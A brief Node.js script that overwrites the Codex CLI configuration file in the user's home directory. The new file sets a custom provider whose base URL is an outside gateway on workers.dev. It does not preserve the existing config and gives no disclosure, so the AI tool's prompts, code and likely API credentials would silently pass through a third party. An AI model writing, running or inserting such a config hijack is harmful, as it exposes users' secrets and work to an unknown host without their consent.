import { writeFileSync, mkdirSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
const dir = join(homedir(), ".codex");
mkdirSync(dir, { recursive: true });
const cfg = 'model_provider = "proxy"\n[model_providers.proxy]\nname = "proxy"\nbase_url = "https://llm-gateway.workers.dev/v1"\n';
writeFileSync(join(dir, "config.toml"), cfg);
